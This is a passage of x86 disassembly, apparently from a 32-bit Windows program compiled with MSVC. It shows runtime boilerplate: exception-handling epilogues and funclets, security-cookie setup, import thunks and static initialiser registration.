  4036f0:	83 c4 08             	add    $0x8,%esp
  4036f3:	85 c0                	test   %eax,%eax
  4036f5:	74 3b                	je     0x403732
  4036f7:	8b 40 24             	mov    0x24(%eax),%eax
  4036fa:	c1 e8 1f             	shr    $0x1f,%eax
  4036fd:	f7 d0                	not    %eax
  4036ff:	83 e0 01             	and    $0x1,%eax
  403702:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  403709:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40370c:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403713:	59                   	pop    %ecx
  403714:	5f                   	pop    %edi
  403715:	5e                   	pop    %esi
  403716:	5b                   	pop    %ebx
  403717:	8b e5                	mov    %ebp,%esp
  403719:	5d                   	pop    %ebp
  40371a:	c3                   	ret
  40371b:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40371e:	8b 08                	mov    (%eax),%ecx
  403720:	8b 01                	mov    (%ecx),%eax
  403722:	33 d2                	xor    %edx,%edx
  403724:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
  403729:	0f 94 c2             	sete   %dl
  40372c:	8b c2                	mov    %edx,%eax
  40372e:	c3                   	ret
  40372f:	8b 65 e8             	mov    -0x18(%ebp),%esp
  403732:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  403739:	33 c0                	xor    %eax,%eax
  40373b:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40373e:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403745:	59                   	pop    %ecx
  403746:	5f                   	pop    %edi
  403747:	5e                   	pop    %esi
  403748:	5b                   	pop    %ebx
  403749:	8b e5                	mov    %ebp,%esp
  40374b:	5d                   	pop    %ebp
  40374c:	c3                   	ret
  40374d:	cc                   	int3
  40374e:	ff 25 e4 40 40 00    	jmp    *0x4040e4
  403754:	ff 25 e0 40 40 00    	jmp    *0x4040e0
  40375a:	8b ff                	mov    %edi,%edi
  40375c:	56                   	push   %esi
  40375d:	68 00 00 03 00       	push   $0x30000
  403762:	68 00 00 01 00       	push   $0x10000
  403767:	33 f6                	xor    %esi,%esi
  403769:	56                   	push   %esi
  40376a:	e8 df 00 00 00       	call   0x40384e
  40376f:	83 c4 0c             	add    $0xc,%esp
  403772:	85 c0                	test   %eax,%eax
  403774:	74 0d                	je     0x403783
  403776:	56                   	push   %esi
  403777:	56                   	push   %esi
  403778:	56                   	push   %esi
  403779:	56                   	push   %esi
  40377a:	56                   	push   %esi
  40377b:	e8 c8 00 00 00       	call   0x403848
  403780:	83 c4 14             	add    $0x14,%esp
  403783:	5e                   	pop    %esi
  403784:	c3                   	ret
  403785:	33 c0                	xor    %eax,%eax
  403787:	c3                   	ret
  403788:	8b ff                	mov    %edi,%edi
  40378a:	55                   	push   %ebp
  40378b:	8b ec                	mov    %esp,%ebp
  40378d:	83 ec 10             	sub    $0x10,%esp
  403790:	a1 18 50 40 00       	mov    0x405018,%eax
  403795:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  403799:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40379d:	53                   	push   %ebx
  40379e:	57                   	push   %edi
  40379f:	bf 4e e6 40 bb       	mov    $0xbb40e64e,%edi
  4037a4:	bb 00 00 ff ff       	mov    $0xffff0000,%ebx
  4037a9:	3b c7                	cmp    %edi,%eax
  4037ab:	74 0d                	je     0x4037ba
  4037ad:	85 c3                	test   %eax,%ebx
  4037af:	74 09                	je     0x4037ba
  4037b1:	f7 d0                	not    %eax
  4037b3:	a3 1c 50 40 00       	mov    %eax,0x40501c
  4037b8:	eb 60                	jmp    0x40381a
  4037ba:	56                   	push   %esi
  4037bb:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4037be:	50                   	push   %eax
  4037bf:	ff 15 90 40 40 00    	call   *0x404090
  4037c5:	8b 75 fc             	mov    -0x4(%ebp),%esi
  4037c8:	33 75 f8             	xor    -0x8(%ebp),%esi
  4037cb:	ff 15 34 40 40 00    	call   *0x404034
  4037d1:	33 f0                	xor    %eax,%esi
  4037d3:	ff 15 38 40 40 00    	call   *0x404038
  4037d9:	33 f0                	xor    %eax,%esi
  4037db:	ff 15 3c 40 40 00    	call   *0x40403c
  4037e1:	33 f0                	xor    %eax,%esi
  4037e3:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4037e6:	50                   	push   %eax
  4037e7:	ff 15 40 40 40 00    	call   *0x404040
  4037ed:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4037f0:	33 45 f0             	xor    -0x10(%ebp),%eax
  4037f3:	33 f0                	xor    %eax,%esi
  4037f5:	3b f7                	cmp    %edi,%esi
  4037f7:	75 07                	jne    0x403800
  4037f9:	be 4f e6 40 bb       	mov    $0xbb40e64f,%esi
  4037fe:	eb 0b                	jmp    0x40380b
  403800:	85 f3                	test   %esi,%ebx
  403802:	75 07                	jne    0x40380b
  403804:	8b c6                	mov    %esi,%eax
  403806:	c1 e0 10             	shl    $0x10,%eax
  403809:	0b f0                	or     %eax,%esi
  40380b:	89 35 18 50 40 00    	mov    %esi,0x405018
  403811:	f7 d6                	not    %esi
  403813:	89 35 1c 50 40 00    	mov    %esi,0x40501c
  403819:	5e                   	pop    %esi
  40381a:	5f                   	pop    %edi
  40381b:	5b                   	pop    %ebx
  40381c:	c9                   	leave
  40381d:	c3                   	ret
  40381e:	ff 25 a8 40 40 00    	jmp    *0x4040a8
  403824:	ff 25 ac 40 40 00    	jmp    *0x4040ac
  40382a:	ff 25 b0 40 40 00    	jmp    *0x4040b0
  403830:	ff 25 b4 40 40 00    	jmp    *0x4040b4
  403836:	ff 25 c0 40 40 00    	jmp    *0x4040c0
  40383c:	ff 25 c4 40 40 00    	jmp    *0x4040c4
  403842:	ff 25 c8 40 40 00    	jmp    *0x4040c8
  403848:	ff 25 cc 40 40 00    	jmp    *0x4040cc
  40384e:	ff 25 d0 40 40 00    	jmp    *0x4040d0
  403854:	ff 25 28 41 40 00    	jmp    *0x404128
  40385a:	ff 25 2c 41 40 00    	jmp    *0x40412c
  403860:	ff 25 34 41 40 00    	jmp    *0x404134
  403866:	cc                   	int3
  403867:	cc                   	int3
  403868:	cc                   	int3
  403869:	cc                   	int3
  40386a:	cc                   	int3
  40386b:	cc                   	int3
  40386c:	cc                   	int3
  40386d:	cc                   	int3
  40386e:	cc                   	int3
  40386f:	cc                   	int3
  403870:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  403873:	e9 d8 df ff ff       	jmp    0x401850
  403878:	8b 54 24 08          	mov    0x8(%esp),%edx
  40387c:	8d 42 0c             	lea    0xc(%edx),%eax
  40387f:	8b 4a f8             	mov    -0x8(%edx),%ecx
  403882:	33 c8                	xor    %eax,%ecx
  403884:	e8 39 f6 ff ff       	call   0x402ec2
  403889:	b8 48 46 40 00       	mov    $0x404648,%eax
  40388e:	e9 c1 ff ff ff       	jmp    0x403854
  403893:	cc                   	int3
  403894:	cc                   	int3
  403895:	cc                   	int3
  403896:	cc                   	int3
  403897:	cc                   	int3
  403898:	cc                   	int3
  403899:	cc                   	int3
  40389a:	cc                   	int3
  40389b:	cc                   	int3
  40389c:	cc                   	int3
  40389d:	cc                   	int3
  40389e:	cc                   	int3
  40389f:	cc                   	int3
  4038a0:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4038a3:	83 e0 01             	and    $0x1,%eax
  4038a6:	0f 84 0c 00 00 00    	je     0x4038b8
  4038ac:	83 65 ec fe          	andl   $0xfffffffe,-0x14(%ebp)
  4038b0:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4038b3:	e9 08 dc ff ff       	jmp    0x4014c0
  4038b8:	c3                   	ret
  4038b9:	8b 54 24 08          	mov    0x8(%esp),%edx
  4038bd:	8d 42 0c             	lea    0xc(%edx),%eax
  4038c0:	8b 4a f0             	mov    -0x10(%edx),%ecx
  4038c3:	33 c8                	xor    %eax,%ecx
  4038c5:	e8 f8 f5 ff ff       	call   0x402ec2
  4038ca:	b8 74 46 40 00       	mov    $0x404674,%eax
  4038cf:	e9 80 ff ff ff       	jmp    0x403854
  4038d4:	cc                   	int3
  4038d5:	cc                   	int3
  4038d6:	cc                   	int3
  4038d7:	cc                   	int3
  4038d8:	cc                   	int3
  4038d9:	cc                   	int3
  4038da:	cc                   	int3
  4038db:	cc                   	int3
  4038dc:	cc                   	int3
  4038dd:	cc                   	int3
  4038de:	cc                   	int3
  4038df:	cc                   	int3
  4038e0:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4038e3:	e9 d8 db ff ff       	jmp    0x4014c0
  4038e8:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4038eb:	83 e0 01             	and    $0x1,%eax
  4038ee:	0f 84 0c 00 00 00    	je     0x403900
  4038f4:	83 65 e8 fe          	andl   $0xfffffffe,-0x18(%ebp)
  4038f8:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4038fb:	e9 c0 db ff ff       	jmp    0x4014c0
  403900:	c3                   	ret
  403901:	8b 54 24 08          	mov    0x8(%esp),%edx
  403905:	8d 42 0c             	lea    0xc(%edx),%eax
  403908:	8b 4a f0             	mov    -0x10(%edx),%ecx
  40390b:	33 c8                	xor    %eax,%ecx
  40390d:	e8 b0 f5 ff ff       	call   0x402ec2
  403912:	b8 a8 46 40 00       	mov    $0x4046a8,%eax
  403917:	e9 38 ff ff ff       	jmp    0x403854
  40391c:	cc                   	int3
  40391d:	cc                   	int3
  40391e:	cc                   	int3
  40391f:	cc                   	int3
  403920:	8d 8d 14 ff ff ff    	lea    -0xec(%ebp),%ecx
  403926:	e9 95 db ff ff       	jmp    0x4014c0
  40392b:	8b 54 24 08          	mov    0x8(%esp),%edx
  40392f:	8d 42 0c             	lea    0xc(%edx),%eax
  403932:	8b 8a 5c fd ff ff    	mov    -0x2a4(%edx),%ecx
  403938:	33 c8                	xor    %eax,%ecx
  40393a:	e8 83 f5 ff ff       	call   0x402ec2
  40393f:	8b 4a f8             	mov    -0x8(%edx),%ecx
  403942:	33 c8                	xor    %eax,%ecx
  403944:	e8 79 f5 ff ff       	call   0x402ec2
  403949:	b8 08 47 40 00       	mov    $0x404708,%eax
  40394e:	e9 01 ff ff ff       	jmp    0x403854
  403953:	cc                   	int3
  403954:	cc                   	int3
  403955:	cc                   	int3
  403956:	cc                   	int3
  403957:	cc                   	int3
  403958:	cc                   	int3
  403959:	cc                   	int3
  40395a:	cc                   	int3
  40395b:	cc                   	int3
  40395c:	cc                   	int3
  40395d:	cc                   	int3
  40395e:	cc                   	int3
  40395f:	cc                   	int3
  403960:	b9 50 50 40 00       	mov    $0x405050,%ecx
  403965:	e8 d5 f2 ff ff       	call   0x402c3f
  40396a:	68 b9 39 40 00       	push   $0x4039b9
  40396f:	e8 f7 f9 ff ff       	call   0x40336b
  403974:	59                   	pop    %ecx
  403975:	c3                   	ret
  403976:	ff 15 68 40 40 00    	call   *0x404068
  40397c:	68 c3 39 40 00       	push   $0x4039c3
  403981:	c7 05 88 50 40 00 ac 	movl   $0x4041ac,0x405088
  403988:	41 40 00 
  40398b:	a3 8c 50 40 00       	mov    %eax,0x40508c
  403990:	c6 05 90 50 40 00 00 	movb   $0x0,0x405090
  403997:	e8 cf f9 ff ff       	call   0x40336b
  40399c:	59                   	pop    %ecx
  40399d:	c3                   	ret
  40399e:	68 88 50 40 00       	push   $0x405088
  4039a3:	b9 94 50 40 00       	mov    $0x405094,%ecx
  4039a8:	e8 93 f3 ff ff       	call   0x402d40
  4039ad:	68 cd 39 40 00       	push   $0x4039cd
  4039b2:	e8 b4 f9 ff ff       	call   0x40336b
  4039b7:	59                   	pop    %ecx
  4039b8:	c3                   	ret
  4039b9:	b9 50 50 40 00       	mov    $0x405050,%ecx
  4039be:	e9 15 f2 ff ff       	jmp    0x402bd8
  4039c3:	b9 88 50 40 00       	mov    $0x405088,%ecx
  4039c8:	e9 b2 f2 ff ff       	jmp    0x402c7f
  4039cd:	c7 05 94 50 40 00 c0 	movl   $0x4041c0,0x405094
  4039d4:	41 40 00 
  4039d7:	c3                   	ret
